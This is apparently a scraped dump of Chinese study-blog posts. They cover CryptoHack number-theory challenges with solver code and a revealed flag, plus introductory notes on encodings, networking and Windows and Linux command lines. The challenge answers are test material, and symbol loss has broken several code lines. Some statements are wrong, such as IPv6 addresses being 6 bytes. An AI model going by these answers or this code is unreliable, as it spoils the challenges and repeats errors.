p 是质数， a 是不被 p 整除的整数，则：$ a^{p−1}≡1(modp) $ 二次剩余例：$ a 11, \\ a^2 \\ 5 \\ mod\\ ( \\ 29\\ ) ,\\ \\ 5的平方根就是11 和 -11（18）$ 当可以在模 p 下 取 x 的平方根时， x 就是二次剩余数Quadratic Residue 计算性质： Quadratic Residue * Quadratic Residue = Quadratic ResidueQuadratic Residue * Quadratic Non-residue = Quadratic Non-residueQuadratic Non-residue * Quadratic Non-residue = Quadratic Residue 勒让德符号Legendre 符号 $(\\frac{a}{p}) ≡ a^{(p−1)2} \\ mod \\ p$ 等于 $ 1$ ：a 是 二次剩余数 等于 $-1$ ：a 是非二次剩余数 等于 $ 0$ ：$a≡0 \\ mod\\ p$ 通过计算 $a^{(p−1)2} \\ mod \\ p$ 即可判断 a 是否为二次剩余数 只可能是这三种情况之一，现在我们能判断 是否为二次剩余数，但是如何求出平方根呢？ 现在假设确定了 a 是二次剩余数，现在求它的平方根，即找到 $x$ 使得 $x^{2} a \\ mod \\ p$， p是质数， Legendre 符号 $(\\frac{a}{p}) ≡ a^{(p−1)2} \\ mod \\ p$ , 先假设 a 是二次剩余数，很自然地让 $ a^{(p−1)2}$乘以 $a$ 再开方，$a^{(p+1)4}$ 就应该是 a 的平方根 $注意到 （a^{(p+1)4})^2 a^{(p+1)2} a^{(p-1)2} × a ，若 a 是二次剩余数，则\\ a^{(p−1)2} 1$ $即（a^{(p+1)4})就是 a 的平方根$ # Now for the flag. # Given the following 1024 bit prime and 10 integers, find the quadratic residue and then calculate its square root; # the square root is your flag. Of the two possible roots, submit the larger one as your answer.# 提示提到 p 满足 p = 3 mod 4 且是质数p = ......ints = [......]power = (p + 1) // 4for i in ints: Legendre_symbol = pow(i,(p-1)//2,p) x = pow(i,power,p) if Legendre_symbol == 1: print(max(x,p-x)) else: print(None) Tonelli-Shanks综上所述，若 a 为二次剩余数，则$（a^{(p+1)4})是 a 的平方根$ 但是这仅适用于 $ a 3 \\ mod \\ 4$ 的情况，还有一种情况 $a 1 \\ mod \\ 4$ 比较复杂，下次再讨论 Sage内置可使用 def Tonelli_Shanks(a,p): Legendre_symbol = pow(a,(p-1)//2,p) if Legendre_symbol == 1: if p % 4 == 3: x = pow(a, (p + 1)//4, p) return min(x,p-x) if p % 4 == 1: # 待解决 return 0 else: return None 中国剩余定理如果一组线性同余式的模互质，则中国剩余定理可以给出它们的唯一解。 已知x满足： x ≡ 2 mod 5 x ≡ 3 mod 11 x ≡ 5 mod 17求：满足 x ≡ a mod (5*11*17) 的 a # 扩展gcd算法def extended_gcd(a, b): if a == 0: return b, 0, 1 gcd, x1, y1 = extended_gcd(b % a, a) x = y1 - (b // a) * x1 y = x1 return gcd, x, y# 求模的逆元def mod_inverse(a, m): gcd, x, y = extended_gcd(a, m) if gcd != 1: return None # 没有逆元 return (x % m + m) % m # 确保结果在 [0, m-1] 范围内# 中国剩余定理def crt(a,m): length = len(m) M = 1 for i in m: M = M * i # 模之积 M_i = [] for i in m: M_i.append(M/i) reverse_M_i = [] for i, j in zip(M_i, m): reverse_M_i.append(mod_inverse(i, j)) sum = 0 for i, j, k in zip(M_i, reverse_M_i, a): sum += i*j*k return sum % Mm = [5,11,17]a = [2,3,5]print(crt(a,m)) 解密加密程序： from random import randinta = 288260533169915p = 1007621497415251FLAG = bcrypto????????????????????def encrypt_flag(flag): ciphertext = [] # bin切换为二进制表示，[2:]去掉 0b前缀，zfill(8)左侧填充0，join将所有字符串拼接 表示之间无间隙 plaintext = .join([bin(i)[2:].zfill(8) for i in flag]) for b in plaintext: e = randint(1, p) n = pow(a, e, p) if b == 1: ciphertext.append(n) else: n = -n % p ciphertext.append(n) return ciphertextprint(encrypt_flag(FLAG)) 加密结果是 很长的一个列表 [67594220461269, 501237540280788, ………] FLAG 中的每个字符都表示成 8位 二进制数，然后拼接成一长串01序列 密文中的每个数 $ n a^e \\ mod \\ p$ ，e 是一个小于 p 的正随机整数。 将01序列转变为数字列表： 为 0，插入 n 为 1，插入 p - n 实际上只需要按顺序检验 数字列表 中的数字 n ，是否存在 e 使得 $ n a^e \\ mod \\ p$ 存在为 1，否则为 0。这样就能恢复二进制序列 然后重新编码成 ASCII 码序列即可 使用 BSGS（Baby Step Giant Step） 求解 $ a^e ≡ n \\ mod\\ p $ 的最小非负整数 e 解密程序： from math import isqrtdef mod_pow(a, e, p): 快速幂取模 return pow(a, e, p)def order(a, p): 模p下a的阶（最小正整数d使得a^d ≡ 1 mod p） d = p - 1 factors = set() x = d # 分解 d 的所有质因子 i = 2 while i*i = x: while x % i == 0: factors.add(i) x //= i i += 1 if x 1: factors.add(x) # 计算阶 for f in sorted(factors): while d % f == 0 and pow(a, d//f, p) == 1: d //= f return ddef is_in_subgroup(a, n, p): 判断 n 是否在 a 生成的子群内 d = order(a, p) return pow(n, d, p) == 1def bsgs(a, n, p): Baby Step Giant Step 求解 a^e ≡ n mod p 的最小非负整数 e a %= p n %= p m = isqrt(p) + 1 # Baby steps value_table = baby = 1 for j in range(m): value_table[baby] = j baby = (baby * a) % p # Giant steps inv_am = pow(a, m * (p - 2), p) # a^-m mod p，费马小定理求逆元 giant = n for i in range(m): if giant in value_table: return i * m + value_table[giant] giant = (giant * inv_am) % p return None # 不存在def discrete_log_exist_and_value(a, n, p): 主函数：判断并输出离散对数 if not is_in_subgroup(a, n, p): return False, None e = bsgs(a, n, p) return True, ea = 288260533169915p = 1007621497415251ciphertext = [67594220461269, 501237540280788, 718316769824518, 296304224247167, 48290626940198, 30829701196032, 521453693392074, 840985324383794, 770420008897119, 745131486581197, 729163531979577, 334563813238599, 289746215495432, 538664937794468, 894085795317163, 983410189487558, 863330928724430, 996272871140947, 352175210511707, 306237700811584, 631393408838583, 589243747914057, 538776819034934, 365364592128161, 454970171810424, 986711310037393, 657756453404881, 388329936724352, 90991447679370, 714742162831112, 62293519842555, 653941126489711, 448552658212336, 970169071154259, 339472870407614, 406225588145372, 205721593331090, 926225022409823, 904451547059845, 789074084078342, 886420071481685, 796827329208633, 433047156347276, 21271315846750, 719248860593631, 534059295222748, 879864647580512, 918055794962142, 635545050939893, 319549343320339, 93008646178282, 926080110625306, 385476640825005, 483740420173050, 866208659796189, 883359067574584, 913405110264883, 898864873510337, 208598541987988, 23412800024088, 911541450703474, 57446699305445, 513296484586451, 180356843554043, 756391301483653, 823695939808936, 452898981558365, 383286682802447, 381394258915860, 385482809649632, 357950424436020, 212891024562585, 906036654538589, 706766032862393, 500658491083279, 134746243085697, 240386541491998, 850341345692155, 826490944132718, 329513332018620, 41046816597282, 396581286424992, 488863267297267, 92023040998362, 529684488438507, 925328511390026, 524897846090435, 413156582909097, 840524616502482, 325719016994120, 402494835113608, 145033960690364, 43932113323388, 683561775499473, 434510534220939, 92584300328516, 763767269974656, 289837041593468, 11468527450938, 628247946152943, 8844724571683, 813851806959975, 72001988637120, 875394575395153, 70667866716476, 75304931994100, 226809172374264, 767059176444181, 45462007920789, 472607315695803, 325973946551448, 64200767729194, 534886246409921, 950408390792175, 492288777130394, 226746605380806, 944479111810431, 776057001143579, 658971626589122, 231918349590349, 699710172246548, 122457405264610, 643115611310737, 999072890586878, 203230862786955, 348112034218733, 240143417330886, 927148962961842, 661569511006072, 190334725550806, 763365444730995, 516228913786395, 846501182194443, 741210200995504, 511935604454925, 687689993302203, 631038090127480, 961606522916414, 138550017953034, 932105540686829, 215285284639233, 772628158955819, 496858298527292, 730971468815108, 896733219370353, 967083685727881, 607660822695530, 650953466617730, 133773994258132, 623283311953090, 436380836970128, 237114930094468, 115451711811481, 674593269112948, 140400921371770, 659335660634071, 536749311958781, 854645598266824, 303305169095255, 91430489108219, 573739385205188, 400604977158702, 728593782212529, 807432219147040, 893541884126828, 183964371201281, 422680633277230, 218817645778789, 313025293025224, 657253930848472, 747562211812373, 83456701182914, 470417289614736, 641146659305859, 468130225316006, 46960547227850, 875638267674897, 662661765336441, 186533085001285, 743250648436106, 451414956181714, 527954145201673, 922589993405001, 242119479617901, 865476357142231, 988987578447349, 430198555146088, 477890180119931, 844464003254807, 503374203275928, 775374254241792, 346653210679737, 789242808338116, 48503976498612, 604300186163323, 475930096252359, 860836853339514, 994513691290102, 591343659366796, 944852018048514, 82396968629164, 152776642436549, 916070996204621, 305574094667054, 981194179562189, 126174175810273, 55636640522694, 44670495393401, 74724541586529, 988608465654705, 870533906709633, 374564052429787, 486493568142979, 469485372072295, 221153171135022, 289713227465073, 952450431038075, 107298466441025, 938262809228861, 253919870663003, 835790485199226, 655456538877798, 595464842927075, 191621819564547]def decrypt_flag(ciphertext): plaintext = for b in ciphertext: exist, e = discrete_log_exist_and_value(a, b, p) if exist: plaintext + 1 print(1,flush=True,end=) else: plaintext + 0 print(0,flush=True,end=) flag = for i in range(0, len(plaintext), 8): binary = plaintext[i:i+8] ascii_value = int(binary, 2) char = chr(ascii_value) flag += char return flagprint(decrypt_flag(ciphertext)) 解密结果： cryptop4tterns_1n_re5idu3s","categories":["CryptoHack"]},{"title":"CryptoHack 第一部分 简介","path":"//CryptoHack-1/","content":"介绍pwntools和编码知识 编码知识所使用函数均来源于 python ASCII 编码chr()函数用于将 ASCII 码转换为字符 ord()执行相反操作 十六进制字符串编码 当我们对数据进行加密时，生成的密文通常是一些二进制数据，其中包含许多非可打印的 ASCII 字符 这些字符在屏幕上无法直接显示，也难以通过文本方式传输（比如通过邮件或聊天工具）。 所以可以将密文编码为十六进制字符串，用户友好且跨系统兼容 bytes.fromhex()函数可用于将十六进制转换为字节 .hex()可以对字节字符串调用实例方法来获取十六进制表示形式。 Base64编码Base64 使用一个由 64 个字符组成的字母表：A-Z（大写字母）、a-z（小写字母）、0-9、+ 和 每个字符代表一个 6 位的二进制值（从 000000 到 111111，十进制 0 到 63）。 4 个字符表示 3 个字节 在 Python 中，使用 导入 base64 模块后import base64，即可使用base64.b64encode()函数。 字节和大整数像 RSA 这样的密码系统只能处理数字，但消息是由字符组成的。 如何将消息转换成数字，以便进行数学运算呢？ 最常见的方法是取出消息的序数字节，将其转换为十六进制，然后连接起来。这可以解释为十六进制十六进制数，也可以表示为十进制十进制数。 消息：HELLOascii 字节：[72, 69, 76, 76, 79]十六进制字节：[0x48, 0x45, 0x4c, 0x4c, 0x4f]base-16：0x48454c4c4fbase-10：310400273487 Python 的 PyCryptodome 库通过方法bytes_to_long()和long_to_bytes()实现了这一点。 需要先安装 PyCryptodome 并使用 from Crypto.Util.number import *导入它 。 异或XOR交换律： A ⊕ B B ⊕ A结合律： A ⊕ (B ⊕ C) (A ⊕ B) ⊕ C恒等式：A ⊕ 0 A自逆： A ⊕ A 0 Python pwntools库中有一个方便的xor()函数，可以对不同类型和长度的数据进行异或运算。 例子0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104 这是使用一个 密钥 对数据加密后的密文，提示说注意 flag 的提交格式 crypto 那就先把密文和 crypto 进行异或，发现输出前面几个字符刚好是 myXORke+y，有点奇怪 有理由怀疑密钥就是 myXORkey，试一试，将密文与密钥再异或，得到了明文 输出一直是一些奇怪字符，最后发现是系统终端 被某些字符影响了，重新打开终端重置状态就好了 很奇怪 附录：函数chr() # 将ASCII码转换为字符ord() # 将字符转换成ASCII码bytes.fromhex() # 将十六进制转换为字节.hex() # 对字节字符串调用实例方法来获取十六进制表示形式。base64.b64encode() # Base64编码 （import base64）bytes_to_long() # 十六字节字符拼接，转化成数字（from Crypto.Util.number import *）long_to_bytes() # 数字转化成十六进制，拆分成字节（from Crypto.Util.number import *）xor() # 对不同类型和长度的数据进行异或运算（from pwn import *）","categories":["CryptoHack"]},{"title":"Cyber Security 101 第六部分 密码学介绍(待更新)","path":"//Cyber-Security-101-6/","content":"探索各种对称和非对称加密算法。发现哈希算法在日常系统中的用途。 密码学仅作介绍，深入了解请看分类 CryptoHack 密码学基础知识密码学的最终目的是确保 在存在对手的情况下也能进行安全通信。 “安全”一词涵盖了通信数据的机密性和完整性。 密码学可以定义为在预期存在对手和第三方的情况下，安全通信和数据保护技术的实践和研究。换句话说，这些对手不应该能够泄露或更改消息的内容。 相关概念 明文Plaintext：加密前原始、可读的消息或数据，可以是文档、图像、多媒体文件或其他二进制数据。 密文Ciphertext：加密后不可读的、经过扰乱的消息版本。理想情况下，除大致大小外，无法从中获取关于明文的任何信息。 密码Cipher：将明文转换为密文并能逆向转换的算法或方法，通常由数学家开发。 密钥Key：密码用于加密或解密数据的一串比特。一般来说，使用的密码是公开知识，但密钥必须保密，除非是非对称加密中的公钥（后续任务将讨论非对称加密）。 加密Encryption：使用密码和密钥将明文转换为密文的过程。与密钥不同，密码的选择是公开的。 解密Decryption：加密的逆过程，使用密码和密钥将密文转换回明文。尽管密码是公开知识，但在不知道密钥的情况下恢复明文应是不可能的（不可行的）。 古典密码凯撒密码将明文的每个字母 按字母表 一起右移 X 位，作为 密文 英文字母表有 26 个字母，移动 26 位将使字母保持不变；因此，使用凯撒密码加密的有效密钥有 25 个。 按照今天的标准，由于密码是公开的，凯撒密码被认为是不安全的。 加密类型对称加密使用相同密钥对数据进行加密和解密。密钥必须保密 DES 3DES AES 非对称加密使用一对密钥，使用公钥对数据进行加密，私钥解密 RSADiffie-Hellman 密钥交换SSH数字签名和证书PGP和GPG哈希基础知识哈希函数存储密码的安全问题使用哈希算法进行安全密码存储识别密码哈希值密码破解完整性检查的哈希算法","categories":["Cyber Security 101"]},{"title":"Cyber Security 101 第五部分 计算机网络(待更新)","path":"//Cyber-Security-101-5/","content":"了解 OSI 模型和 TCPIP模型。探索日常使用的各种网络协议以及WireShark、Tcpdump、Nmap的使用 第一部分 网络概念仅对基础知识做总结，不展开 OSI 模型 TCPIP 模型 应用层（OSI的应用层、表示层、会话层） 传输层 网络层 链路层 物理层 IP地址和子网IP 地址是网络上主机的标识符 分为 IPv4 （4字节）和 IPv6 （6字节） IPv4地址：192.168.1.10：网络地址255：广播地址 子网子网是为了缓解 IPv4 短缺的问题而设计 如图，该设备使用子网掩码 255.255.255.0 划分网络 设备的 IP 地址为：192.168.1.101/24 左边 24 位在整个子网内保持不变 子网 IP 地址范围为：192.168.1.1 ~ 192.168.1.254 192.168.66.0和192.168.66.255分别是网络地址和广播地址。 私有 IP 地址私有 IP 地址是根据 RFC 1918 定义的 IP 地址范围，专门用于私有网络（如家庭、办公室或企业内部网络）。 这些地址不会直接路由到公共互联网，只能在本地网络中使用。 缓解了IPv4地址短缺的问题 私有 IP 地址通常由路由器或网络设备通过 DHCP（动态主机配置协议）或静态分配给设备，用于内部通信。例如，电脑、手机或智能设备在家里连接 Wi-Fi 时，通常会被分配一个私有 IP 地址。 10.0.0.0- 10.255.255.255（10/8） 172.16.0.0- 172.31.255.255（172.16/12） 192.168.0.0- 192.168.255.255（192.168/16） UDP和TCPIP 地址标识主机，使用端口号区分进程，端口号使用两个字节，范围1 ~ 65535，0是保留端口 UDP无连接、不可靠的传输协议 缺点：不保证数据按序到达、不重传丢失数据、无流量控制 优点：速度快、开销低、支持多对多通信 TCP面向连接、可靠的传输协议 TCP连接通过三次握手建立。使用两个标志：SYN（同步）和 ACK（确认）。 SYN 数据包：客户端通过向服务器发送 SYN 数据包来发起连接。此数据包包含客户端随机选择的初始序列号。 SYN-ACK 数据包：服务器使用 SYN-ACK 数据包响应 SYN 数据包，该数据包添加了服务器随机选择的初始序列号。 ACK 数据包：当客户端发送 ACK 数据包以确认收到 SYN-ACK 数据包时，三次握手就完成了。 四次挥手关闭连接 数据传输：保证数据按序、无差错、不丢失地传输，提供错误检测和重传机制。 缺点：开销较大、速度较慢 优点：可靠性高 封装 用户数据 数据报（段）TCP segment UDP datagram 网络数据包 packet 数据链路帧 frame 远程登录TELNET（电传打字网络）协议是一种用于远程终端连接的网络协议。 TELNET 客户端允许您连接到远程系统并与之通信，以及发出文本命令。 telnet 10.10.30.254 13 # 连接到10.10.30.254的13端口 telnet 10.10.30.254 80 # 80端口：HTTP服务GET / HTTP/1.1 # /标识资源路径，为空表示访问服务器根目录Host: your_host # 正在请求的主机# 两次回车 第二部分 网络基础知识DHCP 动态主机配置协议服务器的网络配置通常固定，可以手动配置。但移动设备网络配置不固定。 DHCP：采用自动化方式配置联网设备 遵循四个步骤： DHCP发现：客户端广播 DHCPDISCOVER 消息，寻找本地DHCP服务器（如果存在）。 DHCP提供：服务器以 DHCPOFFER 消息进行响应，其中包含可供客户端接受的 IP 地址。 DHCP请求：客户端以 DHCPREQUEST 消息进行响应，表明它已接受提供的 IP。 DHCP确认：服务器以 DHCPACK 消息进行响应，以确认提供的 IP 地址现已分配给该客户端。 在四个步骤完成之前 客户端是没有 IP 配置的，使用 0.0.0.0 以及本机 MAC 地址向广播 IP 地址 255.255.255.255 和 广播 MAC 地址 ff:ff:ff:ff:ff:ff发送消息，服务器使用发送的 MAC 地址标识设备（链路层） DHCP 过程结束时，设备将收到访问互联网所需的所有配置： IP 地址 将数据包路由到本地网络之外的网关 用于解析域名的 DNS 服务器 ARP 地址解析协议 48位 MAC 地址 两种常用数据链路层：以太网、WIFI 同一以太网上的两台设备 需要知道 对方的IP地址和MAC地址才能一对一联系，一种思路是向 DHCP 服务器查询，另一种就是 ARP地址解析协议 ARP 地址解析协议 ARP 请求：请求者将 目的IP 地址发送到广播 MAC 地址，子网内所有联网设备都会受到请求 ARP 应答：目的 IP 地址受到请求后，答复 MAC 地址 ARP 请求或ARP 应答并非封装在 UDP 或 IP 数据包中，而是直接封装在以太网帧中。 ARP 允许从第 3 层网络层寻址到第 2 层链路层寻址的转换。 ARP协议的必要性在于它提供了一种简单、分布式、高效的 IP 到 MAC 地址解析机制，适用于各种网络环境（无论是否有DHCP服务器）。 直接从DHCP服务器获取MAC地址虽然理论上可行，但会引入额外的复杂性、延迟和单点故障风险，而ARP通过广播和缓存机制很好地解决了这些问题。 ICMP 互联网控制消息协议主要用于网络诊断和错误报告 ping：使用 ICMP 测试与目标系统的连接，测量往返时间 RTT traceroute：使用 ICMP 跟踪主机到目标的路由 路由协议 OSPF（开放最短路径优先）：OSPF 是一种路由协议，允许路由器共享网络拓扑信息，并计算出最高效的数据传输路径。它通过路由器之间交换其所连接链路和网络状态的更新来实现这一点。这样，每个路由器都拥有完整的网络地图，并可以确定到达任何目的地的最佳路由。 EIGRP（增强型内部网关路由协议）：EIGRP 是 Cisco 专有的路由协议，它融合了不同路由算法的诸多特性。它允许路由器共享其可到达网络的信息以及与这些路由相关的成本（例如带宽或延迟）。然后，路由器会利用这些信息来选择最高效的数据传输路径。 BGP（边界网关协议）：BGP 是互联网上使用的主要路由协议。它允许不同的网络（例如互联网服务提供商的网络）交换路由信息，并建立数据在这些网络之间传输的路径。BGP 有助于确保数据即使在跨越多个网络时也能在互联网上高效路由。 RIP（路由信息协议）：RIP 是一种简单的路由协议，常用于小型网络。运行 RIP 的路由器会共享它们可以到达的网络以及到达目标网络所需的跳数（路由器数）。因此，每个路由器都会根据这些信息构建路由表，选择到达每个目标网络的跳数最少的路由。 NAT解决 IPv4 地址耗尽的一种方法就是 网络地址转换 NAT NAT 的理念在于使用 一个公网 IP 地址 为 多个私有 IP 地址 提供互联网访问。 路由器维护一个表，将内部 IP 地址和端口号与其外部 IP 地址和端口号进行映射。 如图，从笔记本电脑的角度来看，该连接是从其 IP 地址192.168.0.129发起的，TCP 源端口号为15401； 然而，Web 服务器会将此连接视为从 212.3.4.5 TCP 端口号19273 建立的 路由器无缝地执行此地址转换。 这种转换受到路由器端口数限制，65536 第三部分 网络核心协议DNS 域名系统DNS 负责将域名映射到 IP 地址 DNS 流量默认使用UDP端口 53，并将TCP端口 53 作为默认回退端口。 DNS 有不同类型： A：将主机名映射到一个或多个 IPv4地址 AAAA：IPv6 CNAME：将域名映射到另一个域名 MX：指定负责处理域电子邮件的邮箱服务器 可以使用 nslookup在命令行中查找域的 IP 地址 WHOISWHOIS 记录提供了注册域名实体的信息 Linux 上可以使用 whois 查询域名信息 HTTP(S)启动浏览器时，主要使用HTTP和 HTTPS 协议。HTTP代表超文本传输协议；HTTPS 中的 S 代表安全。该协议依赖于TCP，并定义了 Web 浏览器与 Web 服务器的通信方式。 Web 浏览器通常向 Web 服务器发出的一些方法如下： GET从服务器检索数据，例如 HTML 文件或图像。 POST允许我们向服务器提交新数据，例如提交表单或上传文件。 PUT用于在服务器上创建新资源以及更新和覆盖现有信息。 DELETE，用于删除服务器上的指定文件或资源。 HTTP和 HTTPS 通常分别使用TCP端口 80 和 443，较少使用其他端口，例如 8080 和 8443。 GET /index.html HTTP/1.1Host: www.example.com FTP：传输文件与旨在检索网页的HTTP不同，文件传输协议 ( FTP ) 旨在传输文件。因此，FTP 的文件传输效率非常高，并且在所有条件相同的情况下，它可以实现比HTTP更高的速度。FTP 命令通常在命令行或专用软件中使用。 FTP协议定义的示例命令如下： USER用于输入用户名 PASS用于输入密码 RETR（retrieve）用于从FTP服务器下载文件到客户端。 STOR(store) 用于将文件从客户端上传到FTP服务器。 FTP服务器默认监听TCP端口 21；数据传输通过从客户端到服务器的另一个连接进行。 SMTP：发送电子邮件POP3：接收电子邮件IMAP：同步电子邮件第四部分 网络安全协议TLS（ transport Layer Security）安全套接字层 (SSL) 和传输层安全性 (TLS) 是用于加密客户端（例如 Web 浏览器）与服务器之间交换数据的协议。SSLTLS 可视为一种封装，它加密各种通信协议（例如HTTP和FTP），从而创建 HTTPS 和 FTPS。SSL 如今已不常用，因为 TLS 已逐渐取代它。 TLS 是传输层的加密协议，允许客户端和服务器在不安全的网络上进行安全通信。这里的 安全 指机密性、完整性 SSLTLS工作流程SSLTLS 握手用于通过以下步骤加密客户端与服务器之间的通信： 客户端问候消息：客户端向服务器发送问候消息，包含客户端支持的 TLS 版本、密码套件以及随机字节。 服务器问候消息：服务器回复问候消息，提供其证书、选定的密码套件和随机字节。 认证：客户端通过发行证书的证书颁发机构验证服务器的证书。例如，访问Google时，Google会分享其证书，浏览器通过预装的证书颁发机构证书进行验证。 预主密钥：客户端使用服务器的公钥（从服务器证书中获取）加密随机字节。 预主密钥解密：服务器使用其私钥解密预主密钥。 会话密钥生成：客户端和服务器基于客户端随机字节、服务器随机字节和预主密钥生成会话密钥。双方将得到相同的结果； 此会话密钥不传输，加密和解密基于此密钥。 准备消息：客户端和服务器使用会话密钥发送“完成”消息，表示会话已准备好传输。此时，客户端和服务器可以通过SSLTLS加密连接交换消息。 HTTPSSMTPS、POP3S、IMAPSSSHSFTP、FTPSVPN第五部分 WireShark第六部分 Tcpdump第七部分 Nmap","categories":["Cyber Security 101"]},{"title":"Cyber Security 101 第四部分 命令行","path":"//Cyber-Security-101-4/","content":"介绍 Windows 命令行和MS PoweShell，以及 Linux 操作系统中 Bash 的用法，包括编写 Shell 脚本 cmdCMD命令属于批处理语言（Batch Script），是一种基于 Windows 命令行环境的脚本语言。 Windows环境下默认命令行解释器是 cmd.exe 基本系统信息set # 检查路径ver # 确定操作系统版本systeminfo # 系统信息介绍cls # 清理cmd屏幕# 命令 | more # 一页一页输出 网络故障排除ipconfig # 检查网络信息，后可加/allping example.com # 检查服务器是否可访问tracert example.com # 跟踪到达目标所经过的网络路由nslookup example.com # 查找主机/域并返回其IP地址netstat # 显示当前网络连接和监听端口# -a显示所有已建立的连接和监听端口# -b显示与每个监听端口和已建立的连接相关的程序# -o显示与连接关联的进程 ID ( PID )# -n使用数字形式表示地址和端口号 文件和磁盘管理cd # 不带参数：显示当前驱动器和目录# 带参数（文件夹路径）：切换目录dir # 查看子目录 # /a 显示隐藏文件 # /s 显示当前目录和子目录所有文件tree # 以直观方式标识目录和子目录mkdir # 创建目录 makermdir # 删除目录 removetype # 查看文本文件内容copy # 复制文件move # 移动文件del # 删除文件erase # 删除文件 可以使用通配符 * 引用多个文件 # 将所有md文件复制到目录copy *.md C:\\Markdown 任务和流程管理tasklist # 列出正在运行的进程，支持筛选tasklist /？ # 查看帮助页面# 查找与notepad.exe相关进程tasklist /FI imagename eq notepad.exe taskkill /PID target_pid # 终止进程 其他命令chkdsk # 检查文件系统和磁盘卷 是否存在错误和坏扇区driverquery # 显示已安装的设备驱动程序列表sfc /sacnnow # 扫描系统文件是否有损坏，并尽可能修复 shutdown /? # 关机、重启、注销等等 PowerShellPowerShell 是一种功能更强大的脚本语言，基于 .NET 框架，专为 Windows 系统管理设计。 面向对象，可以处理复杂数据类型并与系统组件交互 基本语法PowerShell 命令 被称为cmdlets ，遵循一致的Verb-Noun命名约定 使用 Get-Command 查看所有 cmdlet，Alias，Function 使用 Get-Help 命令 可获得命令使用帮助 Get-Alias # 列出所有可使用的别名Get-Command -CommandType Function # 获取函数命令列表Get-Command -Verb Remove # 动词为 Remove 的命令Get-Command -Name Remove* # 使用通配符，同样查询以 Remove 开头的命令 PowerShell 还可以从在线存储库下载其他 cmdlet 来扩展其功能 Find-Module -Name “name” Install-Module -Name “name” 文件系统Get-ChildItem # 浏览目录并查看内容Set-Location # 更改当前目录New-Item -Path .\\file -ItemType Directory # 创建文件夹New-Item -Path .\\text.txt -ItemType File # 创建文件Remove-Item # 删除目录/文件Copy-Item # 相当于copyMove-Item # 相当于moveGet-Content # 相当于cat 管道运输、过滤、排序Get-ChildItem | Sort-Object LengthGet-ChildItem | Where-Object -Property Extension -eq .txt Get-ChildItem | Where-Object -Property Name -like ship* 管道运输符 | 将 Get-ChildItem 的执行结果 传输到后面 Get-ChildItem | Where-Object -Property Length -gt 10 # 筛选大于10的项目Get-ChildItem | Sort-Object Length -Descending | Select-Object -First 1 # 找出最大的项目 系统和网络信息Get-ComputerInfo # 查询全面的系统信息Get-LocalUser # 列出所有本地用户账户Get-NetIPConfiguration # 系统网络接口信息Get-NetIPAddress # 系统网络IP地址信息 实时系统分析Get-Process # 显示所有运行进程Get-Service # 显示所有服务Get-NetTCPConnection # 显示当前TCP连接Get-FileHash # 生成文件哈希 Get-FileHash -Path .\\ship-flag.txt # 生成文件哈希 脚本 对于事件响应人员、恶意软件分析师和威胁猎手等蓝队专业人员来说， PowerShell脚本可以自动执行许多不同的任务，包括日志分析、检测异常和提取入侵指标 (IOC)。这些脚本还可用于对恶意代码（恶意软件）进行逆向工程或自动扫描系统以查找入侵迹象。 对于红队（包括渗透测试人员和道德黑客）而言，PowerShell脚本可以自动执行诸如系统枚举、执行远程命令以及编写混淆脚本以绕过防御等任务。它与所有类型的系统深度集成，使其成为模拟攻击和测试系统抵御现实威胁能力的强大工具。 在网络安全的背景下，系统管理员可以利用PowerShell脚本自动执行完整性检查、管理系统配置和保护网络，尤其是在远程或大规模环境中。PowerShell脚本可以用于强制执行安全策略、监控系统健康状况并自动响应安全事件，从而增强整体安全态势。 编写脚本难度很高，暂时略过 Invoke-Command 它能够实现高效的远程管理，并结合脚本功能，实现跨多台计算机的任务自动化。此外，它还可用于在渗透测试人员（或攻击者）的攻击过程中在目标系统上执行有效载荷或命令。 Invoke-Command -ComputerName Server01 -Credential Domain01\\User01 -ScriptBlock Get-Service -Credential指凭据。远程连接设备 server01 并执行Get-service Linux Shell基础命令 pwdcd Filelscat filename.txtgrep THM file.txt # 在文本文件中搜索THM Linux Shell有多种类型 echo $SHELL # 查看当前Shell类型cat /etc/shells # 列出系统中可以用的终端 Bash 、 Fish 、 Zsh三种 Shell ： history # 查看命令历史记录# 上下键切换历史命令 Shell脚本创建一个Bash 脚本 frist_script.sh，扩展名为 .sh 首行 定义 脚本执行解释器 #!/bin/bash echo Hello,Whats your name?read nameecho Welcome,$name 使用 bash 执行 bash frist_script.sh 授予脚本执行权限然后直接执行 chmod +x frist_script.sh./frist_script.sh 变量your_name=yang # 变量名和等号间不能有空格echo $your_name # 使用变量需要加上 $echo $your_name # 帮助解释器识别变量的边界readonly your_name # 声明变量只读，后续无法修改unset your_name # 删除变量，但不能删除只读变量 变量类型：字符串、整数、数组、环境变量、特殊变量 my_string=Hello # 或单引号，或不用引号declare -i my_integer=42 # 声明变量为整数my_array=(1 2 3 4 5) echo $PATH # PATH是环境变量，包含了操作系统搜索可执行文件的路径 特殊变量： $0 表示脚本名称 ，$1、 $2 表示脚本参数 $# 表示传递给脚本的参数数量，$? 表示上一个命令的退出状态等 字符串变量，双引号内可以使用变量、转义字符，而单引号内所有内容都会原样输出 your_name=yangstring=Hello,$your_name ! # 字符串拼接（单引号也一样）echo $string read name # 接收用户的输入，存储在变量nameecho $#name # 获取字符串长度，$#name 等价于 $#name[0]echo $#name:1:3 # 从第2个字符开始截取3个字符 echo $array_name[@] # 获取数组中的所有元素 传递参数执行一个脚本，传递 1、2、3 三个参数 bash test.sh 1 2 3 在脚本内部，使用 $0 表示脚本名称 ，$1、 $2 、$3表示脚本参数 还可以用$# 表示传递给脚本的参数数量，$? 表示上一个命令的退出状态 $* 显示所有参数 $$ 获取脚本运行的当前进程ID Shell运算符介绍算术运算符、关系运算符、逻辑运算符 原生bash不支持简单的数学运算，但是可以通过其他命令来实现，例如 awk 和 expr，expr 最常用。 expr 是一款表达式计算工具，使用它能完成表达式的求值操作。 val=`expr 2 + 2` 常用算术运算符：+ - * / % = == != 关系运算符只支持数字，不支持字符串，除非字符串的值是数字。 常用关系运算符：-eq -ne -gt -lt -ge --le if [ $a -eq $b]then echo $a -eq $b : a 等于 belse echo $a -eq $b : a 不等于 bfi 逻辑运算符 || 还有字符串运算符、文件测试运算符、自增自减运算符等等 也可以使用 (()) 进行算术运算，也可直接使用 echoecho -n Loading... # 不换行输出echo -e First line Second line # 启用转义字符echo hello output.txt # 输出到文件并覆盖， 是追加# 彩色文本，\\033[0m 重置属性，42绿背景，31红字echo -e \\033[42;31mGreen Background with Red Text\\033[0m printf暂时略过 条件if conditionthen command1 command2 ... commandN else commandfi 代码块不可为空，要么就不写 else if condition1then command1elif condition2 then command2else commandNfi 循环#!/bin/bashfor i in 